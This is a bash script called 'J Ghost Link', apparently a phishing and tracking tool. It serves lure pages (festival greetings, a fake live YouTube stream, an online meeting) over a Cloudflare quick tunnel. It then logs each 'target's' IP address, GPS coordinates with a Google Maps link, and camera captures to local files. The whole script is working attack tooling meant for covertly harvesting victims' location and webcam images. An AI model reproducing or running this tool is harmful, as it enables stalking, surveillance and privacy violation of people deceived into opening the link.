#!/bin/bash
# J Ghost Link
# Created by jh4ck3r From J Project Platform
# Meet me: https://jprojectplatform.com

# Windows compatibility check
if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
  # We're on Windows
  windows_mode=true
  echo "Windows system detected. Some commands will be adapted for Windows compatibility."
  
  # Define Windows-specific command replacements
  function killall() {
    taskkill /F /IM "$1" 2>/dev/null
  }
  
  function pkill() {
    if [[ "$1" == "-f" ]]; then
      shift
      shift
      taskkill /F /FI "IMAGENAME eq $1" 2>/dev/null
    else
      taskkill /F /IM "$1" 2>/dev/null
    fi
  }
else
  windows_mode=false
fi

trap 'printf "\n";stop' 2

banner() {
clear
printf "\e[1;92m       ░▒▓█▓▒░        ░▒▓██████▓▒░  ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓██████▓▒░   ░▒▓███████▓▒░ ░▒▓████████▓▒░ \e[0m\n"
printf "\e[1;92m       ░▒▓█▓▒░       ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░           ░▒▓█▓▒░     \e[0m\n"
printf "\e[1;92m       ░▒▓█▓▒░       ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░           ░▒▓█▓▒░     \e[0m\n"
printf "\e[1;92m       ░▒▓█▓▒░       ░▒▓█▓▒▒▓███▓▒░ ░▒▓████████▓▒░ ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓██████▓▒░     ░▒▓█▓▒░     \e[0m\n"
printf "\e[1;92m░▒▓█▓▒░░▒▓█▓▒░       ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░        ░▒▓█▓▒░    ░▒▓█▓▒░     \e[0m\n"
printf "\e[1;92m░▒▓█▓▒░░▒▓█▓▒░       ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░        ░▒▓█▓▒░    ░▒▓█▓▒░     \e[0m\n"
printf "\e[1;92m ░▒▓██████▓▒░         ░▒▓██████▓▒░  ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓██████▓▒░  ░▒▓███████▓▒░     ░▒▓█▓▒░     \e[0m\n"
printf "\e[1;92m    ════════════════════════════════════════════════\e[0m\n"
printf " \e[1;93m           J GHOST LINK - Advanced Tool \e[0m \n"
printf " \e[1;77m      Created by jh4ck3r From J Project Platform \e[0m \n"
printf " \e[1;77m            Meet me: https://jprojectplatform.com \e[0m \n"
printf "\n"
}



show_menu() {
    printf "\e[1;92m╔══════════════════════════════════════════════════╗\e[0m\n"
    printf "\e[1;92m║                 TUNNEL SERVER                    ║\e[0m\n"
    printf "\e[1;92m╠══════════════════════════════════════════════════╣\e[0m\n"
    printf "\e[1;92m║   \e[1;77m1\e[0m\e[1;92m. CloudFlare Tunnel                         ║\e[0m\n"
    printf "\e[1;92m║                                                  ║\e[0m\n"
    printf "\e[1;92m║   Select option [\e[1;77m1\e[0m\e[1;92m]: \e[0m"
}

show_templates() {
    printf "\e[1;92m╔══════════════════════════════════════════════════╗\e[0m\n"
    printf "\e[1;92m║                 CHOOSE TEMPLATE                  ║\e[0m\n"
    printf "\e[1;92m╠══════════════════════════════════════════════════╣\e[0m\n"
    printf "\e[1;92m║   \e[1;77m1\e[0m\e[1;92m. Events Wishes                           ║\e[0m\n"
    printf "\e[1;92m║   \e[1;77m2\e[0m\e[1;92m. Live Youtube TV                            ║\e[0m\n"
    printf "\e[1;92m║   \e[1;77m3\e[0m\e[1;92m. Online Meeting                             ║\e[0m\n"
    printf "\e[1;92m║                                                  ║\e[0m\n"
    printf "\e[1;92m║   Select template [\e[1;77m1\e[0m\e[1;92m]: \e[0m"
}

show_status() {
    printf "\e[1;92m╔══════════════════════════════════════════════════╗\e[0m\n"
    printf "\e[1;92m║                    STATUS                       ║\e[0m\n"
    printf "\e[1;92m╠══════════════════════════════════════════════════╣\e[0m\n"
}

show_message() {
    printf "\e[1;92m║ \e[1;93m%-52s \e[0m║\n" "$1"
}

show_end() {
    printf "\e[1;92m╚══════════════════════════════════════════════════╝\e[0m\n"
}

dependencies() {
command -v php > /dev/null 2>&1 || { 
    show_status
    show_message "I require php but it's not installed. Install it. Aborting."
    show_end
    exit 1; 
}
}

stop() {
if [[ "$windows_mode" == true ]]; then
  # Windows-specific process termination
  taskkill /F /IM "php.exe" 2>/dev/null
  taskkill /F /IM "cloudflared.exe" 2>/dev/null
else
  # Unix-like systems
  checkphp=$(ps aux | grep -o "php" | head -n1)
  checkcloudflaretunnel=$(ps aux | grep -o "cloudflared" | head -n1)

  if [[ $checkphp == *'php'* ]]; then
    killall -2 php > /dev/null 2>&1
  fi

  if [[ $checkcloudflaretunnel == *'cloudflared'* ]]; then
    pkill -f -2 cloudflared > /dev/null 2>&1
    killall -2 cloudflared > /dev/null 2>&1
  fi
fi

exit 1
}

catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
show_status
show_message "IP: $ip"
show_end

cat ip.txt >> saved.ip.txt
}

catch_location() {
  # First check for the current_location.txt file which is always created
  if [[ -e "current_location.txt" ]]; then
    show_status
    show_message "Current location data received!"
    # Filter out unwanted messages before displaying
    location_data=$(grep -v -E "Location data sent|getLocation called|Geolocation error|Location permission denied" current_location.txt)
    while IFS= read -r line; do
        show_message "$line"
    done <<< "$location_data"
    show_end
    
    # Move it to a backup to avoid duplicate display
    mv current_location.txt current_location.bak
  fi

  # Then check for any location_* files
  if [[ -e "location_"* ]]; then
    location_file=$(ls location_* | head -n 1)
    lat=$(grep -a 'Latitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
    lon=$(grep -a 'Longitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
    acc=$(grep -a 'Accuracy:' "$location_file" | cut -d " " -f2 | tr -d '\r')
    maps_link=$(grep -a 'Google Maps:' "$location_file" | cut -d " " -f3 | tr -d '\r')
    
    show_status
    show_message "Latitude: $lat"
    show_message "Longitude: $lon"
    show_message "Accuracy: $acc meters"
    show_message "Google Maps: $maps_link"
    show_end
    
    # Create directory for saved locations if it doesn't exist
    if [[ ! -d "saved_locations" ]]; then
      mkdir -p saved_locations
    fi
    
    mv "$location_file" saved_locations/
    show_status
    show_message "Location saved to saved_locations/$location_file"
    show_end
  else
    show_status
    show_message "No location file found"
    show_end
  fi
}

checkfound() {
# Create directory for saved locations if it doesn't exist
if [[ ! -d "saved_locations" ]]; then
  mkdir -p saved_locations
fi

show_status
show_message "Waiting for targets..."
show_message "Press Ctrl + C to exit"
show_message "GPS Location tracking is ACTIVE"
show_end

while [ true ]; do

if [[ -e "ip.txt" ]]; then
show_status
show_message "Target opened the link!"
show_end
catch_ip
rm -rf ip.txt
fi

sleep 0.5

# Check for current_location.txt first (our new immediate indicator)
if [[ -e "current_location.txt" ]]; then
show_status
show_message "Location data received!"
show_end
catch_location
fi

# Also check for LocationLog.log (the original indicator)
if [[ -e "LocationLog.log" ]]; then
show_status
show_message "Location data received!"
show_end
# Don't display the raw log content, just process it
catch_location
rm -rf LocationLog.log
fi

# Don't display error logs to avoid showing unwanted messages
if [[ -e "LocationError.log" ]]; then
# Just remove the file without displaying its contents
rm -rf LocationError.log
fi

if [[ -e "Log.log" ]]; then
show_status
show_message "Cam file received!"
show_end
rm -rf Log.log
fi
sleep 0.5

done 
}

cloudflare_tunnel() {
if [[ -e cloudflared ]] || [[ -e cloudflared.exe ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { 
    show_status
    show_message "I require unzip but it's not installed. Install it. Aborting."
    show_end
    exit 1; 
}
command -v wget > /dev/null 2>&1 || { 
    show_status
    show_message "I require wget but it's not installed. Install it. Aborting."
    show_end
    exit 1; 
}

show_status
show_message "Downloading Cloudflared..."
show_end

# Detect architecture
arch=$(uname -m)
os=$(uname -s)

show_status
show_message "Detected OS: $os, Architecture: $arch"
show_end

# Windows detection
if [[ "$windows_mode" == true ]]; then
    show_status
    show_message "Windows detected, downloading Windows binary..."
    show_end
    wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe -O cloudflared.exe > /dev/null 2>&1
    if [[ -e cloudflared.exe ]]; then
        chmod +x cloudflared.exe
        # Create a wrapper script to run the exe
        echo '#!/bin/bash' > cloudflared
        echo './cloudflared.exe "$@"' >> cloudflared
        chmod +x cloudflared
    else
        show_status
        show_message "Download error..."
        show_end
        exit 1
    fi
else
    # Non-Windows systems
    # macOS detection
    if [[ "$os" == "Darwin" ]]; then
        show_status
        show_message "macOS detected..."
        show_end
        if [[ "$arch" == "arm64" ]]; then
            show_status
            show_message "Apple Silicon (M1/M2/M3) detected..."
            show_end
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64.tgz -O cloudflared.tgz > /dev/null 2>&1
        else
            show_status
            show_message "Intel Mac detected..."
            show_end
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz -O cloudflared.tgz > /dev/null 2>&1
        fi
        
        if [[ -e cloudflared.tgz ]]; then
            tar -xzf cloudflared.tgz > /dev/null 2>&1
            chmod +x cloudflared
            rm cloudflared.tgz
        else
            show_status
            show_message "Download error..."
            show_end
            exit 1
        fi
    # Linux and other Unix-like systems
    else
        case "$arch" in
            "x86_64")
                show_status
                show_message "x86_64 architecture detected..."
                show_end
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
                ;;
            "i686"|"i386")
                show_status
                show_message "x86 32-bit architecture detected..."
                show_end
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared > /dev/null 2>&1
                ;;
            "aarch64"|"arm64")
                show_status
                show_message "ARM64 architecture detected..."
                show_end
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1
                ;;
            "armv7l"|"armv6l"|"arm")
                show_status
                show_message "ARM architecture detected..."
                show_end
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1
                ;;
            *)
                show_status
                show_message "Architecture not specifically detected ($arch), defaulting to amd64..."
                show_end
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
                ;;
        esac
        
        if [[ -e cloudflared ]]; then
            chmod +x cloudflared
        else
            show_status
            show_message "Download error..."
            show_end
            exit 1
        fi
    fi
fi
fi

show_status
show_message "Starting php server..."
show_end
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2

show_status
show_message "Starting cloudflared tunnel..."
show_end
rm -rf .cloudflared.log > /dev/null 2>&1 &

if [[ "$windows_mode" == true ]]; then
    ./cloudflared.exe tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
else
    ./cloudflared tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
fi

sleep 10
link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
if [[ -z "$link" ]]; then
show_status
show_message "Direct link is not generating, check following possible reason"
show_message "CloudFlare tunnel service might be down"
show_message "If you are using android, turn hotspot on"
show_message "CloudFlared is already running, run: killall cloudflared"
show_message "Check your internet connection"
show_message "Try running: ./cloudflared tunnel --url 127.0.0.1:3333"
show_message "On Windows, try: cloudflared.exe tunnel --url 127.0.0.1:3333"
show_end
exit 1
else
show_status
show_message "Direct link: $link"
show_end
fi
payload_cloudflare
checkfound
}

payload_cloudflare() {
link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
sed 's+forwarding_link+'$link'+g' template.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
elif [[ $option_tem -eq 2 ]]; then
sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
else
sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
fi
rm -rf index3.html
}

jghostlink() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

banner
show_menu
read option_server
option_server="${option_server:-1}"

if [[ $option_server -eq 1 ]]; then
    select_template
    cloudflare_tunnel
else
    show_status
    show_message "Invalid option!"
    show_end
    sleep 1
    clear
    jghostlink
fi
}

select_template() {
clear
banner
show_templates
read option_tem
option_tem="${option_tem:-1}"

if [[ $option_tem -eq 1 ]]; then
    show_status
    show_message "Enter festival name: "
    show_end
    printf "\e[1;92m║   Festival name: \e[0m"
    read fest_name
    fest_name="${fest_name//[[:space:]]/}"
elif [[ $option_tem -eq 2 ]]; then
    show_status
    show_message "Enter YouTube video watch ID: "
    show_end
    printf "\e[1;92m║   YouTube ID: \e[0m"
    read yt_video_ID
elif [[ $option_tem -eq 3 ]]; then
    printf ""
else
    show_status
    show_message "Invalid template option! try again"
    show_end
    sleep 1
    select_template
fi
}

banner
dependencies
jghostlink